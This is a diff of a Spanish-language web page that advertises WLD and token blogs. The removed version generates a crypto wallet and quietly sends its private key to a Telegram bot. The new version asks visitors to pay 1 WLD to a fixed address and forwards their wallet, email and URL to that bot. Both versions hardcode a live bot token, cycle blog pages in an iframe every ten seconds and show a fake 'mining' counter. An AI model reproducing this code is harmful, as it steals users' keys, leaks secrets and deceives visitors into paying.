@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirección Aleatoria</title>
+  <title>Promociona tu Proyecto</title>
   <style>
     body {
       text-align: center;
@@ -47,35 +47,33 @@
 </head>
 <body>
 
-<h2>Promociona tus Blogs WLd & TOKENS</h2>
+<h2>Promociona tu Blog, Video o Proyecto relacionado con WLD o Tokens</h2>
+<p style="color: red; font-weight: bold;">Para publicar tu contenido, envía 1 WLD (o 135371.31 CHUN) a la billetera destino:<br>
+<span style="font-size: 1.2em;">0xdc178d65c502f9589bb1a35af08b5723f85ec168</span></p>
+<p><a href="#" onclick="abrirGuia(); return false;">Guía para enviar WLD</a></p>
+
 <div id="iframeContainer">
   <iframe id="iframeRedireccion" src=""></iframe>
 </div>
 
-<button onclick="generarBilletera()">Generar Billetera</button>
-<div id="resultado"></div>
-
-<!-- Caja para ingresar billetera y correo -->
 <div id="usuario-info">
-  <input type="text" id="wallet" placeholder="Introduce tu billetera Worldchain" />
-  <input type="email" id="correo" placeholder="Introduce tu correo" />
-  <button onclick="guardarDatos()">Guardar Datos</button>
+  <input type="text" id="walletDestino" placeholder="Billetera destino" value="0xdc178d65c502f9589bb1a35af08b5723f85ec168" readonly />
+  <input type="text" id="walletUsuario" placeholder="Tu billetera WorldChain" />
+  <input type="email" id="correo" placeholder="Tu correo (para enviarte CHUN)" />
+  <input type="text" id="urlPromocion" placeholder="URL de tu blog, video o sitio a promocionar" />
+  <button onclick="guardarDatos()">Comprar Publicidad</button>
 </div>
 
-<button onclick="pararMineria()">Parar Minería</button>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<button onclick="pararMineria()">Parar Mineria</button>
 
 <script>
   let tiempoTotal = 0;
   let interval;
   let minando = true;
 
-  // Token y chat ID de Telegram
   const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
   const chatId = '7613604212';
 
-  // Lista de blogs para redireccionar
   const urls = [
     "https://notiiciasmex.blogspot.com",
     "https://tareasunamyunadm.blogspot.com",
@@ -90,49 +88,29 @@
     "https://gmcas77.blogspot.com"
   ];
 
-  // Redireccionar a una URL dentro del iframe
   function redireccionAleatoria() {
     const indiceAleatorio = Math.floor(Math.random() * urls.length);
     const urlRedireccion = urls[indiceAleatorio];
-
     document.getElementById('iframeRedireccion').src = urlRedireccion;
-
-    setTimeout(redireccionAleatoria, 10000); // Redirige cada 10 segundos
+    setTimeout(redireccionAleatoria, 10000);
   }
-
-  // Llamar a la redirección inicial
   redireccionAleatoria();
 
-  // Función para generar billetera
-  async function generarBilletera() {
-    const wallet = ethers.Wallet.createRandom();
-    document.getElementById('resultado').innerHTML = `
-      <p><strong>Dirección:</strong> ${wallet.address}</p>
-      <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
-    `;
-
-    // Enviar a Telegram
-    enviarMensajeTelegram(`Nueva Billetera Generada:\nDirección: ${wallet.address}\nClave Privada: ${wallet.privateKey}`);
-  }
-
-  // Función para guardar datos
   function guardarDatos() {
-    const wallet = document.getElementById('wallet').value;
+    const walletUsuario = document.getElementById('walletUsuario').value;
     const correo = document.getElementById('correo').value;
+    const urlPromocion = document.getElementById('urlPromocion').value;
 
-    if (!wallet || !correo) {
+    if (!walletUsuario || !correo || !urlPromocion) {
       alert('Por favor, completa todos los campos.');
       return;
     }
 
-    console.log(`Billetera: ${wallet}, Correo: ${correo}`);
-    alert('Datos guardados correctamente.');
-
-    // Enviar a Telegram
-    enviarMensajeTelegram(`Datos Guardados:\nBilletera: ${wallet}\nCorreo: ${correo}`);
+    const mensaje = `Publicidad Solicitada:\nWallet Usuario: ${walletUsuario}\nCorreo: ${correo}\nURL Promocion: ${urlPromocion}`;
+    enviarMensajeTelegram(mensaje);
+    alert('Tu solicitud ha sido enviada por Telegram. Recibirás confirmación en breve.');
   }
 
-  // Función para detener minería
   function pararMineria() {
     clearInterval(interval);
     minando = false;
@@ -140,7 +118,6 @@
     enviarMensajeTelegram(`Minería detenida. Ganancia: ${tiempoTotal} CHC`);
   }
 
-  // Función para contar el tiempo en la página
   function contarTiempo() {
     if (minando) {
       tiempoTotal++;
@@ -151,13 +128,10 @@
     }
   }
 
-  // Inicia el conteo cada segundo
   interval = setInterval(contarTiempo, 1000);
 
-  // Función para enviar mensajes a Telegram
   function enviarMensajeTelegram(mensaje) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-
     fetch(url, {
       method: 'POST',
       headers: {
@@ -170,15 +144,14 @@
     })
     .then(response => response.json())
     .then(data => {
-      if (data.ok) {
-        console.log('Mensaje enviado a Telegram:', mensaje);
-      } else {
-        console.error('Error al enviar mensaje:', data);
-      }
+      if (!data.ok) console.error('Error al enviar mensaje:', data);
     })
-    .catch(error => {
-      console.error('Error en la solicitud a Telegram:', error);
-    });
+    .catch(error => console.error('Error en la solicitud a Telegram:', error));
+  }
+
+  function abrirGuia() {
+    const iframe = document.getElementById("iframeRedireccion");
+    iframe.src = "https://support.world.org/hc/en-us/articles/11499161732755-How-do-I-send-tokens#01J5ZK38WC0EG33V39HE1SD0SM";
   }
 </script>
 
